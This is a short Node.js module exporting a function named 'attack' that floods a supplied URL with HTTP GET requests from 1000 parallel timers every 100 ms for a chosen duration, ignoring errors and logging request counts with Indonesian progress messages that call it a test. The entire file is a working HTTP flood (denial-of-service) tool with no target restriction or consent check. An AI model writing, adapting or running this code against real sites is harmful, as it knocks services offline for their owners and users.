const axios = require('axios');
const fs = require('fs-extra');
const path = require('path');

function attack(url, duration, callback) {
  let count = 0;
  const threads = 1000;
  const delay = 100;
  const end = Date.now() + duration * 1000;
  const logDir = path.join(__dirname, 'logs');
  fs.ensureDirSync(logDir);
  const logFile = path.join(logDir, `attack-${Date.now()}.log`);
  fs.writeFileSync(logFile, `Attack started at ${new Date().toISOString()} to ${url}\n`);

  const progress = setInterval(() => {
    const msg = `⏳ Progress: ${count} request terkirim...`;
    fs.appendFileSync(logFile, msg + '\n');
    callback(msg);
  }, 5000);

  for (let i = 0; i < threads; i++) {
    const interval = setInterval(async () => {
      if (Date.now() > end) {
        clearInterval(interval);
        return;
      }
      try {
        await axios.get(url);
        count++;
      } catch {
        // abaikan error
      }
    }, delay);
  }

  setTimeout(() => {
    clearInterval(progress);
    const result = `✅ Pengujian selesai! Total: ${count} request. Log: ${logFile}`;
    fs.appendFileSync(logFile, result + '\n');
    callback(result);
  }, duration * 1000 + 500);
}

module.exports = { attack };